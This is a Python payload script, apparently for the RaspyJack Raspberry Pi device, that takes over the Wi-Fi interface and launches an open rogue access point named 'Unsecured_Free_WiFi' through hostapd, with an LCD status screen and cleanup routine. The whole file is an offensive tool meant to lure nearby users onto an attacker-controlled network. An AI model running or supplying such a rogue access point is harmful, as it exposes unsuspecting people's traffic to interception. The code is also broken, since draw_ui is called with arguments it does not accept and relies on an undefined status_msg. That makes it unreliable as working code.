#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi.raspyjack_integration import (
    get_best_interface,
    set_raspyjack_interface
)

WIFI_INTERFACE = get_best_interface(prefer_wifi=True)
ORIGINAL_WIFI_INTERFACE = None
ROGUE_SSID = "Unsecured_Free_WiFi"
ROGUE_CHANNEL = "6"
RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
TEMP_CONF_DIR = os.path.join(RASPYJACK_DIR, "tmp", "raspyjack_rogueap")

PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_process = None

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    if running:
        running = False
        if attack_process:
            try: os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
            except: pass
        
        subprocess.run("pkill hostapd 2>/dev/null || true", shell=True)
        
        if ORIGINAL_WIFI_INTERFACE:
            subprocess.run(f"ifconfig {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
            subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed 2>/dev/null || true", shell=True)
            subprocess.run(f"ifconfig {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
            time.sleep(1)
            
            subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
            subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
            time.sleep(5)
            
            subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
            time.sleep(5)
            
            WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE
            
        if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "WiFi Rogue AP", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if "Running" in status_msg or "Press" in status_msg:
        d.text((10, 60), status_msg, font=FONT, fill="yellow")
    else:
        d.text((5, 25), f"SSID: {ROGUE_SSID}", font=FONT, fill="white")
        d.text((5, 36), f"Channel: {ROGUE_CHANNEL}", font=FONT, fill="white")
        d.text((5, 47), f"IP: {WIFI_INTERFACE}", font=FONT, fill="white")
        d.text((5, 58), f"DNS: {WIFI_INTERFACE}", font=FONT, fill="white")

    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def start_attack():
    global attack_process, ORIGINAL_WIFI_INTERFACE
    
    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
    
    if not set_raspyjack_interface(WIFI_INTERFACE):
        print(f"Failed to activate {WIFI_INTERFACE}", file=sys.stderr)
        return False
    
    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
    time.sleep(1)
    
    subprocess.run("pkill hostapd 2>/dev/null || true", shell=True)
    
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={ROGUE_SSID}\nhw_mode=g\nchannel={ROGUE_CHANNEL}\n")
    
    attack_process = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid)
    return True

if __name__ == '__main__':
    try:
        if subprocess.run("which hostapd", shell=True, capture_output=True).returncode != 0:
            draw_ui("hostapd not found!")
            time.sleep(3)
            raise SystemExit("`hostapd` command not found.")

        draw_ui("STARTING")
        if start_attack():
            while running:
                draw_ui("ACTIVE")
                if GPIO.input(PINS["KEY3"]) == 0: cleanup()
                time.sleep(1)
        else:
            draw_ui("FAILED")
            time.sleep(3)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Rogue AP payload finished.")